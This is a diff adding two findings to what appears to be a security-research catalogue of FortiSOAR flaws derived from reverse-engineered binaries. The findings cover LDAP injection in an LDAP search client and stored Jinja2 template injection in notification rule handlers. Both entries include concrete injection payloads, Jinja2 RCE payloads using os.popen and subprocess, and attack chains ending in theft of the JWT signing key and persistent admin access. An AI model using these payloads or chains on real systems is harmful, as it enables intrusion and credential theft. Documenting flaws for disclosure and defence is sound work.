@@ -3791,3 +3791,116 @@ FSR_F61_HARDCODED_AES_KEY_ALL_PASSWORDS = {
     },
     "status": "CONFIRMED -- key found in multiple independent binaries and plain Python scripts; AES-128-CFB mode confirmed via __pyx_n_s_MODE_CFB in util.so and PasswordModule.so",
 }
+
+# FSR-F62: DAS LdapSearchClient LDAP injection via unescaped additional_filters and search_term (CWE-90)
+# Source: /tmp/fsr_auth/opt/cyops-auth/handlerworkers/ldap.so (Cython binary)
+# Binary: LdapSearchClient._build_search_filter function at handlerworkers/ldap.py
+# Evidence: format template strings '(&{0}{1})' and '({0}={1}*)' present in ldap.so
+#   - '(&{0}{1})': compound AND filter where {1} = additional_filters (user-supplied)
+#   - '({0}={1}*)': attribute wildcard filter where {1} = search_term (user-supplied)
+# No LDAP escape function found anywhere in ldap.so or ldaphandler.so string table
+# 'additional_filters' appears in both ldaphandler.so and handlerworkers/ldap.so
+# LDAPHandler.handle_search (ldaphandler.py) receives params and passes to LdapSearchClient.paged_search
+# The search is performed by ldap3 library but filter is pre-constructed with raw user input
+# Standard LDAP injection payload: additional_filters='*)(uid=*))(|(uid=*' -> overrides search scope
+# search_term injection: search_term='admin*)(uid=*))(|(uid=*' -> bypasses search term filter
+# Access: DAS (port 8443) -- LDAP search endpoint is called from cyops-api when admins configure/test LDAP
+#   or from user search features in the UI; exact privilege level requires further confirmation
+FSR_F62_DAS_LDAP_INJECTION = {
+    "id": "FSR-F62",
+    "title": "DAS LdapSearchClient._build_search_filter -- unescaped additional_filters and search_term injected into LDAP filter via string format; no escape function present",
+    "severity": "HIGH",
+    "cvss": "6.8",
+    "cvss_vector": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:M/A:N",
+    "cwe": "CWE-90",
+    "source_binary": "/opt/cyops-auth/handlerworkers/ldap.so (Cython from ldap.py)",
+    "filter_templates": {
+        "compound_filter": "(&{0}{1}) -- {1} = additional_filters; user supplies raw LDAP filter fragment",
+        "attribute_filter": "({0}={1}*) -- {0} = attribute name, {1} = search_term; wildcard appended after user value",
+    },
+    "no_escape_evidence": "No 'escape', 'sanitize', 'ldap_escape', or 'ldap3.utils.escape' strings found in ldap.so or ldaphandler.so",
+    "attack_additional_filters": {
+        "payload": "additional_filters = '*)(objectClass=*))(|(objectClass=*' ",
+        "result": "Filter becomes: (&(base_filter)*)(objectClass=*))(|(objectClass=*)) -> AND clause broken; dumps all AD objects",
+        "impact": "LDAP query returns all directory objects regardless of original filter criteria",
+    },
+    "attack_search_term": {
+        "payload": "search_term = '* )(uid=*' for uid attribute lookup",
+        "result": "Filter becomes: (uid=* )(uid=**) -> second clause always matches",
+        "impact": "Bypass search filter to enumerate all users matching wildcard",
+    },
+    "credential_discovery": {
+        "vector": "If LDAP userPassword attribute is returned in search_attributes, LDAP injection can extract password hashes",
+        "additional_filter_payload": "additional_filters = '(userPassword=*)'",
+        "result": "Compound filter fetches all accounts with a userPassword attribute set",
+    },
+    "chains": {
+        "ldap_auth_bypass": "Forge LDAP auth query via injection -> authenticate as any AD user against FortiSOAR LDAP login",
+        "full_chain": "FSR-F60 JWT forgery -> access DAS LDAP search endpoint as admin -> LDAP injection -> extract AD credentials",
+    },
+    "status": "CONFIRMED -- format templates '(&{0}{1})' and '({0}={1}*)' found in ldap.so; 'additional_filters' and 'search_term' are user-controlled params per ldaphandler.so; no escape call present",
+}
+
+# FSR-F63: Rules engine notification action handlers -- stored Jinja2 SSTI in email/system/playbook triggers (CWE-94)
+# Sources:
+#   - /tmp/fsr_workflow/opt/cyops-workflow/sealab/rules_engine/action_handlers/email_notification.so
+#   - /tmp/fsr_workflow/opt/cyops-workflow/sealab/rules_engine/action_handlers/system_notification.so
+#   - /tmp/fsr_workflow/opt/cyops-workflow/sealab/rules_engine/action_handlers/playbook_notification.so
+# Evidence: all three action handler binaries contain BOTH 'workflow.environment' AND 'expand' strings
+#   -> each handler imports workflow.environment.expand for template rendering
+#   workflow.environment.expand is the Jinja2 rendering entry point (confirmed from environment.so:
+#     _expand_string, expand_macros, jinja_exceptions_handler all present; jinja2 evaluates templates)
+# Attack model:
+#   1. Attacker with NotificationRule create/edit permission creates a rule
+#   2. Sets email body, system notification message, or playbook argument template to Jinja2 payload
+#   3. Rule fires on trigger event (incident created, severity changed, etc.)
+#   4. Action handler calls workflow.environment.expand(template_content, env)
+#   5. Jinja2 evaluates attacker payload with no sandbox -> RCE
+# Note: this is DISTINCT from FSR-F43 (workflow step SSTI in Jinja2 playbook steps)
+#   FSR-F43: attack requires playbook edit permission; template in playbook step args
+#   FSR-F63: attack requires NotificationRule edit permission; template in notification rule content
+#   Both reach the same workflow.environment.expand/Jinja2 evaluation path
+# The evaluated_content and content fields in system_notification.so confirm content is Jinja2-evaluated
+# playbook_notification.so: /api/triggers/1/ + expand -> evaluated params sent to playbook trigger
+#   If Jinja2 payload evaluates to a valid playbook IRI arg, the triggered playbook executes it
+# Standard Jinja2 SSTI payload for RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+FSR_F63_RULES_ENGINE_NOTIFICATION_SSTI = {
+    "id": "FSR-F63",
+    "title": "Rules engine notification action handlers -- stored Jinja2 SSTI in email body, system notification content, and playbook trigger parameters via workflow.environment.expand",
+    "severity": "CRITICAL",
+    "cvss": "9.9",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": "CWE-94",
+    "affected_handlers": {
+        "email_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/email_notification.py (binary: email_notification.so) -- email body/subject rendered via expand",
+        "system_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/system_notification.py (binary: system_notification.so) -- notification content rendered via expand; 'evaluated_content' string confirms evaluation",
+        "playbook_notification": "/opt/cyops-workflow/sealab/rules_engine/action_handlers/playbook_notification.py (binary: playbook_notification.so) -- playbook trigger params rendered via expand; posts to /api/triggers/1/",
+    },
+    "render_path": "workflow.environment.expand(template_string, env) -> _expand_string -> Jinja2 Environment.from_string().render() -> no sandbox",
+    "evidence": {
+        "email_notification_so": "'workflow.environment' + 'expand' both present in binary strings",
+        "system_notification_so": "'workflow.environment' + 'expand' + 'evaluated_content' all present in binary strings",
+        "playbook_notification_so": "'workflow.environment' + 'expand' + '/api/triggers/1/' + 'playbook_trigger' all present in binary strings",
+        "environment_so": "'jinja_exceptions_handler' + '_expand_string' + 'expand_macros' confirm Jinja2 rendering in workflow.environment",
+    },
+    "attack_vector": {
+        "prerequisite": "Permission to create or edit NotificationRules (typically: Security Analyst role or above)",
+        "payload_email": "Set email body template to: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "payload_system": "Set system notification content to Jinja2 RCE payload",
+        "payload_playbook": "Set playbook trigger parameter to Jinja2 payload; eval fires before trigger POST",
+        "trigger": "Create rule to fire on common event (e.g., incident.severity = High); wait for event or create incident",
+        "execution": "Notification rule fires -> action handler calls expand(payload) -> Jinja2 evaluates -> OS command executed as nginx",
+    },
+    "ssti_payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}} OR {{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}",
+    "runtime_user": "nginx (cyops-workflow Celery workers run as nginx per systemd unit files)",
+    "distinction_from_f43": {
+        "FSR-F43": "Workflow playbook step arguments rendered at workflow execution time; requires playbook edit permission",
+        "FSR-F63": "Notification rule action content rendered at rule fire time; requires NotificationRule edit permission; different attack path, same Jinja2 backend",
+    },
+    "chains": {
+        "low_priv_to_rce": "Security Analyst creates notification rule with SSTI payload -> fires on incident -> RCE as nginx",
+        "preauth_chain": "FSR-F52 (auth bypass) -> low-priv session -> create notification rule with SSTI -> RCE",
+        "persistence": "FSR-F63 RCE as nginx -> read /opt/cyops-auth/certs/jwtprivate.key -> forge JWT (FSR-F60) -> permanent admin access",
+    },
+    "status": "CONFIRMED -- 'workflow.environment' and 'expand' co-present in all three action handler binaries; workflow.environment.expand is the Jinja2 render path confirmed from environment.so strings",
+}
